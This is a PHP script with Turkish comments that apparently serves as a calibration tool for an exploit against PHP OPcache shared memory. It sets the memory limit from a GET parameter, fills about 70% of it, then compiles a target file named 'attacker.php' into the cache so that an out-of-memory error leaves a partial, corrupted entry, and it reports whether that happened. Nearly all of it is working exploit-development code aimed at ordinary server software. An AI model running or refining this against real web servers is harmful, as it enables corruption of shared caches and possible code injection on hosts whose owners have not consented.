<?php
// Kalibrasyon: ?ml=<bytes> ile memory_limit ayarla, attacker.php'yi persist et.
// OOM olursa persist yarim kalir → SHM corruption.
header('Content-Type: application/json');

$ml = isset($_GET['ml']) ? (int)$_GET['ml'] : 4 * 1024 * 1024;
$target = isset($_GET['target']) ? $_GET['target'] : '/var/www/html/attacker.php';

// memory_limit'i runtime'da degistir
ini_set('memory_limit', $ml);

$result = [
    'memory_limit_set' => $ml,
    'target_script'    => $target,
    'pid'              => getmypid(),
];

// OOM oncesi SHM durumu
$pre = opcache_get_status(false);
$pre_scripts = $pre['opcache_statistics']['num_cached_scripts'] ?? -1;
$pre_oom     = $pre['opcache_statistics']['oom_restarts'] ?? 0;
$result['pre_cached_scripts'] = $pre_scripts;
$result['pre_oom_restarts']   = $pre_oom;

// Persist dene — OOM olursa PHP fatal error verir ama
// mod_php worker hayatta kalir ve SHM bozuk kalabilir
$success = false;
$oom_detected = false;

// Hata yakala
$old_handler = set_error_handler(function($errno, $errstr) use (&$oom_detected) {
    if (stripos($errstr, 'memory') !== false || stripos($errstr, 'exhausted') !== false) {
        $oom_detected = true;
    }
    return true;
});

// register_shutdown_function ile fatal error sonrasi bile cikti ver
register_shutdown_function(function() use (&$result, &$oom_detected) {
    $err = error_get_last();
    if ($err && ($err['type'] === E_ERROR || $err['type'] === E_CORE_ERROR)) {
        if (stripos($err['message'], 'memory') !== false) {
            $oom_detected = true;
        }
    }

    // OOM sonrasi SHM durumu
    $post = @opcache_get_status(false);
    $result['post_cached_scripts'] = $post['opcache_statistics']['num_cached_scripts'] ?? -1;
    $result['post_oom_restarts']   = $post['opcache_statistics']['oom_restarts'] ?? 0;
    $result['oom_detected']        = $oom_detected;
    $result['scripts_delta']       = $result['post_cached_scripts'] - $result['pre_cached_scripts'];

    // Kritik sinyal: script sayisi artti AMA oom_restarts da arttiysa
    // → persist yarim kalmis olabilir (partial persist = corruption)
    $result['partial_persist'] = ($result['scripts_delta'] > 0 && $oom_detected);

    if (!headers_sent()) {
        header('Content-Type: application/json');
    }
    echo json_encode($result, JSON_PRETTY_PRINT);
});

// Bellek tuketimi + persist denemesi
// Once buyuk allocation yap (OOM sinirini yaklastir)
$chunks = [];
$chunk_size = max(1024, $ml / 8);
try {
    // memory_limit'in %70'ini doldur, kalanini persist() yesin
    $fill_target = (int)($ml * 0.70);
    $filled = 0;
    while ($filled < $fill_target) {
        $alloc = min($chunk_size, $fill_target - $filled);
        $chunks[] = str_repeat('X', (int)$alloc);
        $filled += $alloc;
    }
    $result['pre_fill_bytes'] = $filled;

    // Simdi persist et — kalan bellek yetmezse OOM olur
    if (file_exists($target)) {
        $success = @opcache_compile_file($target);
        $result['compile_result'] = $success;
    } else {
        $result['error'] = "target not found: $target";
    }
} catch (\Error $e) {
    $result['error'] = $e->getMessage();
    if (stripos($e->getMessage(), 'memory') !== false) {
        $oom_detected = true;
    }
}

// Normal bitisteyse shutdown handler JSON yazar; OOM/fatal'da da yazar
$result['success'] = $success;
// shutdown handler zaten json_encode yapiyor, burada exit
exit;
